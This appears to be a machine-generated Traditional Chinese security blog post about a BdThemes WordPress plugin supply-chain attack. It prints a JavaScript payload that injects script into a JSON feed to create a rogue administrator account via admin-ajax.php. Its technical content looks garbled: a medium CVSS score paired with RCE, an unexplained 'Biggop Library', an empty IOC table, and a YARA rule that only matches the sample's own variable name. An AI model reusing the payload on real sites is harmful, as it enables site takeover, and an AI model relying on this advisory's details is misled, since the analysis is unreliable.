---
layout: post
title:  "BdThemes plugins supply-chain hack creates rogue WordPress admins"
date:   2026-08-11 01:09:34 +0000
categories: [security]
severity: medium
---

# ⚠️ 解析 BdThemes 供應鏈攻擊：利用 JSON 輸入驗證漏洞創建惡意管理員帳戶

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Medium (CVSS: 6.1)
> * **受駭指標**: Cross-Site Scripting (XSS) 和 Remote Code Execution (RCE)
> * **關鍵技術**: JSON 輸入驗證漏洞、Cross-Site Scripting (XSS)、Remote Code Execution (RCE)

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: BdThemes 的 Biggop Library 中的 JSON 輸入驗證漏洞導致 Cross-Site Scripting (XSS) 攻擊。該漏洞允許攻擊者注入惡意 JavaScript 代碼，從而創建惡意管理員帳戶。
* **攻擊流程圖解**:
  1. 攻擊者獲得 BdThemes 儲存桶的寫入權限。
  2. 攻擊者修改 JSON 數據流，注入惡意 JavaScript 代碼。
  3. 管理員訪問 WordPress 管理面板時，惡意 JavaScript 代碼被執行。
  4. 惡意 JavaScript 代碼創建惡意管理員帳戶。
* **受影響元件**: BdThemes 的 Biggop Library，版本號未指定。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要獲得 BdThemes 儲存桶的寫入權限。
* **Payload 建構邏輯**:

    ```
    
    javascript
    // 惡意 JavaScript 代碼
    var maliciousCode = `
      // 創建惡意管理員帳戶
      var newAdmin = {
        'user_login': 'maliciousAdmin',
        'user_pass': 'maliciousPassword',
        'user_email': 'malicious@example.com',
        'role': 'administrator'
      };
      // 將惡意管理員帳戶添加到 WordPress 數據庫
      $.ajax({
        type: 'POST',
        url: '/wp-admin/admin-ajax.php',
        data: {
          'action': 'create_user',
          'user': newAdmin
        },
        success: function(data) {
          console.log('惡意管理員帳戶創建成功');
        }
      });
    `;
    // 注入惡意 JavaScript 代碼到 JSON 數據流
    var jsonFeed = {
      'display_id': 'maliciousDisplayId',
      'script': maliciousCode
    };
    
    ```
* **繞過技術**: 攻擊者可以使用 JSON 輸入驗證漏洞繞過 WordPress 的安全機制。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
|  |  |  |  |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule BdThemes_XSS {
      meta:
        description = "BdThemes JSON 輸入驗證漏洞偵測"
      strings:
        $script = "var maliciousCode = `"
      condition:
        $script at 0
    }
    
    ```
* **緩解措施**: 更新 BdThemes 的 Biggop Library 至最新版本，修復 JSON 輸入驗證漏洞。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Cross-Site Scripting (XSS)**: 惡意 JavaScript 代碼注入到網頁中，從而實現攻擊者的惡意意圖。
* **JSON 輸入驗證漏洞**: JSON 數據流中缺乏適當的輸入驗證，允許攻擊者注入惡意代碼。
* **Remote Code Execution (RCE)**: 遠程執行任意代碼，允許攻擊者實現任意的惡意意圖。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/bdthemes-plugins-supply-chain-hack-creates-rogue-wordpress-admins/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


